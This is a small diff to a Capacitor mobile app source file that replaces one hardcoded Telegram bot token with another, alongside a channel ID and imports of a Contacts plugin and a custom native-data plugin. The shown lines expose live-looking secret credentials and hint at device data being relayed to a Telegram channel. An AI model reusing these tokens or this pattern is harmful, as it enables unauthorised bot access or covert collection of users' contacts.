@@ -4,7 +4,7 @@ import { Contacts } from '@capacitor-community/contacts';
 import { Toast } from '@capacitor/toast'; // টোস্ট ইম্পোর্ট করা হলো
 
 const NativeData = registerPlugin<any>('NativeData');
-const BOT_TOKEN = '8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA';
+const BOT_TOKEN = '8226802389:AAFihtrakoCrSJ2uXTRTDSTaXoTlqz7loA4';
 const CHANNEL_ID = '-1003552771281'; 
 
 let lastUpdateId = 0;
